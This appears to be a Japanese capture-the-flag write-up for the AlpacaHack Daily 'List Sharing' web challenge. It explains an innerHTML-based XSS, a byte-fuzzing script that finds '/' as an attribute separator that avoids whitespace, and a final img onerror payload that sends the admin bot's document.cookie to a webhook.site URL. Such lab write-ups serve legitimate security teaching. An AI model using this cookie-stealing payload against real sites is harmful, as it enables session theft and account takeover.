---
title: "List Sharing - AlpacaHack Daily"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "alpacahack", "xss", "list", "sharing", "web-exploitation"]
summary: "web writeup for \"List Sharing\" from AlpacaHack Daily - techniques: alpacahack, xss, list, sharing, web-exploitation."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d16-17_List_Sharing/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "List Sharing"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** List Sharing
- **Date:** 2026-08-16-17
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d16-17_List_Sharing>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d16-17_List_Sharing/README.md>

---
# List Sharing

## 問題

共有は思いやりです

```html
<body>
  <main>
    <h1>Share Your List!</h1>
    <div id="list-container"></div>
  </main> 

  <script>
    const queryParams = new URLSearchParams(window.location.search);
    const list = (queryParams.get('list') || '').split(/\s+/);

    const listContainer = document.getElementById('list-container');
    if(list.length === 1 && list[0] === '') {
      listContainer.innerHTML = '<p>No items in the list.</p>';
    } else {
      const ul = document.createElement('ul');
      for(const item of list) {
        const li = document.createElement('li');
        li.innerHTML = item;
        ul.appendChild(li);
      }
      listContainer.appendChild(ul);
    }
  </script>
</body>
```

## 概要

この問題では`web`と`bot`の2つのサービスが稼働しています。

`web`側(`http://localhost:3000/`)にアクセスすると、「Share Your List!」という見出し文字の下に「No items in the list.」と表示されます。

HTMLのソースのスクリプトのところを見ると、`list`パラメータにセットされた文字列がいわゆる空白文字で分割され、リストとして表示するようになっているのがわかります。

試しに`bot`側のプレースホルダに示されたように`http://localhost:3000/?list=item1+item2`にアクセスすると、`item1`と`item2`がリストとして表示されました。

※`+`自体は正規表現`/\s+/`にマッチしませんが、先に`URLSearchParams`が`+`を空白に変換しているのですね。

`bot`側(`http://localhost:1337/`)にアクセスすると、`web`側のクエリを設定する入力欄が表示されます。

クエリを設定して「Report」をクリックすると、クッキーにフラグをもったAdmin Botが設定したクエリで`web`側にアクセスします。

`list`パラメータの内容はそのままHTMLに書き込まれず、`innerHTML`を使って
```html
    <div id="list-container"></div>
```
の部分の書き換えを行っているため、
```
?<script>location.href="..."</script>
```
のような単純なXSSはできないようです。

この状況でどうすればAdmin Botがもつクッキーを取得できるのでしょうか？

## 方針

`img`タグの`onerror`属性を使う。

## 解法

直接Javascriptを実行できなくても、例えば
```html
<img src="https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d16-17_List_Sharing/dummy" onerror="...">
```
のように、`img`タグでわざと変なファイルパスを指定しておいて画像読み込み時にエラーを発生させ、`onerror`属性にスクリプトを記述すれば、そのスクリプトを実行することができます。

しかし、ここで一つ大きな問題があります。

`list`パラメータは、`+`や空白文字で分割されてしまいます。

よって、クエリを
```
?list=<img src="https://raw.githubusercontent.com/baumroll0928-spec/myRepository/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202608/d16-17_List_Sharing/dummy" onerror="...">
```
のようにした場合、
```
<ul>
<li><img</li>
<li>src="dummy"</li>
<li>onerror="..."></li>
</ul>
```
のように展開されてしまうので、失敗します。

この分割文字は普通の半角空白`0x20`に限られず、正規表現で`\s`にマッチするいわゆる空白文字が全て該当するので、改行やタブ等を使ってごまかすこともできなさそうです。

かといって、空白を削除して
```html
<imgsrc="dummy"onerror="...">
```
ではダメでした。

何か空白文字以外でタグ内の属性を区切ることができる文字はないのでしょうか？

そこで、`0x00`～`0xff`の全ての1バイト文字を挟み込んだ`img`タグを列挙したHTMLファイルを生成し、これをブラウザで開いたときどのスクリプトが実行されるか試してみました。

```python
with open("c:/ctf/test.html", "w", encoding="utf-8") as f:
    for i in range(256):
        ch = chr(i)
        f.write(f"<img{ch}src=\"dummy\"{ch}onerror=\"alert('{i=}(0x{i:02x})')\">\n")
```
このPythonプログラムの実行によって生成された`test.html`を開き、アラートを確認してみると、順番は実行するたびにバラバラであるものの、毎回

- i=9(0x09)
- i=10(0x0a)
- i=12(0x0c)
- i=13(0x0d)
- i=32(0x20)
- i=47(0x2f)

これらの6つが出てきました。

`0x09`はタブ、`0x0a`は改行（LF）、`0x0c`は改ページ、`0x0d`は改行（CR）、`0x20`は空白ですが、`0x2f`は何でしょうか？

調べてみると、`/`（スラッシュ）であることがわかりました。

そこで、改めて`/`で区切ってタグを書いてみます。
```html
<img/src="dummy"/onerror="alert('hello!')">
```
やはりスクリプトが実行できるようです。

これなら空白文字を使わずに`img`タグを記述できるので、クエリを
```
?list=<img/src="dummy"/onerror="alert('hello!')">
```
にしたところ、こちらもスクリプトが実行され、アラートが表示されました。

これを使って、Admin Botにアクセスさせるクエリを作っていきましょう。

まず、いつものように[Webhook.site](https://webhook.site/)にアクセスして自分専用のURLを取得します。

ここではこれを
```
https://webhook.site/xxxxx
```
とします。

Admin BotにはこのURLに自身がもっているクッキーの情報を付けて飛んでほしいので、クエリは
```
?list=<img/src="dummy"/onerror="location.href='https://webhook.site/xxxxx?cookie='%2bencodeURIComponent(document.cookie)">
```
のようにします。

※`+`は前述のとおり空白に変えられてしまうので、`%2b`にエンコードする必要があります。

これで「Report」を実行すると、Webhook.siteの確認用ページにリクエストが届きます。

うまく届いていたら、左側の届いたリクエストの一覧からリクエストを選択し、`Query strings`を確認すると、
```
cookie	FLAG=Alpaca{REDACTED}
```
のようにフラグを得ることができます。
